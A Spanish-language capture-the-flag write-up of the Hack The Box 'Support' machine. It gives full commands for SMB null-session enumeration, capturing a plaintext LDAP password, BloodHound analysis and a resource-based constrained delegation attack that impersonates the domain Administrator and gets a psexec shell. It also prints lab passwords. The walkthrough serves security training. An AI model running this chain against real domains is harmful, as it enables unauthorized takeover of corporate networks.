---
title: Hack The Box - Support
tags: [nmap, smb, smbclient, netexec, WriteAll, PowerView, Powermad, WinRM, Privilege Escalation, Kerberos, Ticket, Wireshark, ldap]
layout: post
---

La máquina Support fue bastante entretenida y su nivel de dificultad está bien ajustado. Puede complicarse un poco si no se tiene experiencia revisando tráfico con Wireshark, pero en general es un reto manejable. Hay dos formas de resolverla: una es analizando el tráfico capturado, y la otra es haciendo reversing al .exe que aparece en el recurso compartido por SMB. Esta última ruta es un poco más técnica, pero tampoco es algo imposible.
Lo que más me llamó la atención fue la parte en la que se puede impersonar al usuario Administrator usando un equipo falso, ya que no lo había aplicado antes.
Eso sería todo, ojalá les sirva la explicación y se animen a probarla.


## Summary
![Support](https://github.com/user-attachments/assets/f152aae3-ed05-4608-a0f9-310431fcc139)


- nmap scan
- null smb session
- wireshark traffic sniff
- bloodhound
- password in info field
- Privilege escalation via ticket impersonation

---
## Port Scan
Comenzamos con el escaneo de todos los puertos:

`nmap 10.10.11.174 -p- -sS -Pn --min-rate 5000 -vvv -n -oA 10.10.11.174_allPorts`

El resultado:

```
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49686/tcp open  unknown          syn-ack ttl 127
49691/tcp open  unknown          syn-ack ttl 127
49703/tcp open  unknown          syn-ack ttl 127
```

Ahora con la utilidad `extractPorts`, extraemos todos los puertos para tenerlos en la clipboard y poder hacer un scaneo de esos puertos lanzando scripts básicos de reconocimiento:

```
extractports 10.10.11.174_allPorts.gnmap
```

![Pasted image 20250619162822](https://github.com/user-attachments/assets/4cc22f4f-0ebd-434d-adb2-f5f9437a3829)

Realizamos el scan:

```
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49674,49686,49691,49703 -vvv 10.10.11.174
```

El resultado:

```
PORT     STATE SERVICE       VERSION 
53/tcp   open  domain        Simple DNS Plus                        
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-17 02:29:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn        
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
```

No sacamos nada muy interesante, pero con los puertos que podemos ver abiertos tales como los de Kerberos, ldap, smb, etc. nos dice que lo mas probable es que nos estemos enfrentando ante un Domain Controller (DC).
Ya que se encuentra el puerto 445 abierto (SMB) y no tenemos credenciales, podemos intentar loguearnos con un null session o con un usuario sin contraseña:

```
netexec smb 10.10.11.174 -u 'noexiste' -p '' --shares
```

![Pasted image 20250619163728](https://github.com/user-attachments/assets/8565ac89-9d6f-4f60-ab4a-e4084ba1fc1e)

Vemos que tenemos acceso a la carpeta no standar "support -tools", nos conectamos con smbclient para listar su contenido:

```
smbclient //10.10.11.174/support-tools -U noexiste
```

![Pasted image 20250619163835](https://github.com/user-attachments/assets/90a5d015-7694-447a-a40f-4358adbfc820)

Podemos analizar cada uno de estos ejecutables, algunos no tiene caso analizarlos ya que son ejecutables portables o setups, asi que asi ya descartamos un par.
El archivo mas interesante que se puede sacar de esta lista es `UserInfo.exe.zip` ya que no es un binario conocido como lo puede ser Putty por ejemplo.
Nos transferimos el archivo:

```
get UserInfo.exe.zip
```

Y utilizamos unzip para obtener su contenido:

```
uzip UserInfo.exe
```

![Pasted image 20250619165933](https://github.com/user-attachments/assets/66cf7a7b-c6c8-48b8-94db-a78529502f3f)

El archivo que destaca es el `UserInfo.exe` que no sabemos lo que hace aún. Al ser un archivo .exe en condiciones normales no se podría ejecutar en una maquina linux, pero al tener instalado el framework de dotnet si lo podriamos ejecutar sin ningun problema.
[TIP] Para instalar el framework de dotnet y poder ejecutar los archivos .exe en nuestro sistema linux, recomiendo ver la explicacion que de ippsec en su video: [dotnet install](https://youtu.be/iIveZ-raTTQ?si=OZjvqJ8SxeI_AwxI&t=3289)

Al ejecutar el binario vemos las opciones que nos permite ejecutar:
![Pasted image 20250619170243](https://github.com/user-attachments/assets/160ef9d6-0de0-4c90-971e-13a7460bcce4)
Al querer ejecutar algun comando nos dice que ocurrio un error:
![Pasted image 20250619170354](https://github.com/user-attachments/assets/4889c9e7-9f69-4a8b-9b61-35052496c309)
Ya que es un error de conexión, podemos inferir que se está intentando de realizar algún tipo de query a algún lado.
Si capturamos el trafico con wireshark, seleccionando la interfaz `any` y filtramos por `dns`, podemos ver a donde se está realizando la query:
![Pasted image 20250619170641](https://github.com/user-attachments/assets/adf20f1b-b5f5-4489-898d-705ff7c906b9)
Se está realizando hacia `support.htb`, entonces lo agregamos a nuestro `/etc/hosts`:

```
sudo echo '10.10.11.174 support.htb' >> /etc/hosts 
```

Ahora al intentar utilizar el binario nos da otro tipo de error:
![Pasted image 20250619170917](https://github.com/user-attachments/assets/7127e8dd-9634-4d0c-ba30-cd39e7ac9ebf)
Ahora nos da "No Such Object" por lo que ahora no encuentra lo que le estamos pidiendo que busque. Ya que las querys ahora estarían corriendo por la interfaz tun0, podemos capturar el trafico:
![Pasted image 20250619171120](https://github.com/user-attachments/assets/95d197b1-d10d-4e9f-8aad-9cacf1daaacb)
Obtenemos nuevo trafico y podemos ver las querys, varias son por LDAP, podemos ver una en especial que contiene un usuario `support\ldap`:
![Pasted image 20250619171239](https://github.com/user-attachments/assets/bbc6f202-e5b7-4fda-9969-0dcb25e02a2d)
Viendo este paquete y filtrando podemos ver una contraseña en texto plano ya que está utilizando una autenticación simple.

```
ldap:nvEfEK16^1aM4$e7Acl<SNIP>
```

Probamos estas credenciales para ver si son validas:

```
netexec smb 10.10.11.174 -u ldap -p 'nvEfEK16^1aM4$e7A<SNIP>'
```

Es válida, pero aún no tenemos acceso remoto por WinRM por ejemplo, lo que quedaría de hacer puede ser la enumeración de usuarios:

```
netexec smb 10.10.11.174 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --rid-brute
```

![Pasted image 20250619171923](https://github.com/user-attachments/assets/0887066a-38cb-4c70-b564-18762f5af7dc)
Esto es un paso extra de reconocimiento para tener distintos vectores de ataque, ya que con una lista de usuarios válidos se podria realizar un password sprying.
Sin embargo, al tener ya credenciales válidas se puede utilizar la herramienta de bloodhound para ver como está funcionando todo el DC por dentro y también ver si tenemos algo interesante para ver.
En mi caso estoy utilizando el bloodhound community edition (bloodhound-ce), por lo que utilizo el ingestor compatible para mi version:

```
bloodhound-ce-python -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -ns 10.10.11.174 -d support.htb -c all
```

Al tener los archivos .json, los importamos dentro de bloodhound y podemos ver algo interesante como:
![Pasted image 20250619172547](https://github.com/user-attachments/assets/092969be-86b3-4a15-87d2-3d87e4423837)
El usuario support, que es parte de el grupo Shared Support Accounts, que a su vez tiene permisos de GenericAll sobre el DC. Esto es crítico, ya que al tener GenericAll sobre un objeto como un computador, se pueden realizar ataques como un shadow credential attack, o el ataque que realizaremos que es obtener un ticket impersonando al usuario Administrator.
Los pasos para realizar este ataque son:
- Primero hacia la máquina Windows debemos importar `powermad.ps1` y `PowerView.ps1`
- Luego creamos un computador
- Obtenemos el SID del computador creado
- Construir un ACE generico con el SID del computador creado como principal
- Darle el atributo en el campo msDS-AllowedToActOnBehalfOfOtherIdentity
- Obtener el ticket con herramientas como getST.py
Entonces, para seguir estos pasos primeramente necesitamos una forma de entrar como el usuario support. Como no tenemos credenciales, pero si tenemos credenciales validas del usuario ldap, es logico pensar que podemos hacer consultas a traves de ldap para ver si se encuentra algun tipo de informacion relacionada al usuario support, esto lo logramos con la herramienta ldapsearch:

```
ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'dc=support,dc=htb' > ldap.out
```

Buscando filtrando por el CN=Support encontramos una contraseña en el campo de información y no en el campo de descripción como se encuentra normalmente en otros escenarios:
![Pasted image 20250619191853](https://github.com/user-attachments/assets/c73d722e-5e19-4100-9e57-301a5a163d84)
Al tener estas credenciales podemos comprobar que tenemos acceso por WinRM:

```
netexec winrm 10.10.11.174 -u support -p Ironside47pleasure40Watchful
```

![Pasted image 20250619192104](https://github.com/user-attachments/assets/4fa47c4e-0b48-42a6-a7ce-6cbf0a627d4e)

Una vez dentro, ya podemos seguir el vector de ataque que listamos anteriormente, primero transfiriendo e importando los modulos necesarios:

```
upload powermad.ps1
upload PowerView.ps1
import-module .\powermad.ps1
import-module .\PowerView.ps1
```

Primero, necesitamos crear un computador llamado atacante1 con la contraseña Password123!:

```
New-MachineAccount -MachineAccount atacante1 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
[+] Machine account atacante1 added
```

Luego obtenemos el SID del computador creado:

```
$ComputerSid = Get-DomainComputer atacante1 -Properties objectsid | Select -Expand objectsid
```

Luego construimos un ACE generico con el SID del computador creado, despues obteniendo los bytes para el nuevo DACL/ACE:

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)
```

Finalmente debemos settear este security descriptor en el campo msDS-AllowedToActOnBehalfOfOtherIdentity en el computador que queremos atacar, que en este caso es el DC, podemos hacer este paso importante ya que tenemos GenericAll ante este computador, si no tuvieramos este permiso no podriamos realizar el ataque:

```
Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Si todo sale bien, ahora podemos continuar el ataque desde nuestra maquina linux obteniendo el ticket impersonando al usuario Administrator del DC, esto lo logramos utilizando la herramienta `getST.py`, (recordar agregar también a dc.support.htb al `/etc/hosts`):

```
getST.py -spn 'cifs/dc.support.htb' -impersonate 'Administrator' 'domain/atacante1$:Password123!'
```

Esto nos genera un ticket el cual lo importamos en la variable `KRB5CCNAME`:

```
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

Con esto ya podriamos entrar directamente utilizando la herramienta de psexec indicando que nos queremos autenticar utilizando kerberos:

```
impacket-psexec -k dc.support.htb
```

![Pasted image 20250619195141](https://github.com/user-attachments/assets/f8861c24-6859-4bcb-8324-36930763de66)
Y eso es todo!, gracias por leer:)

~x0tic
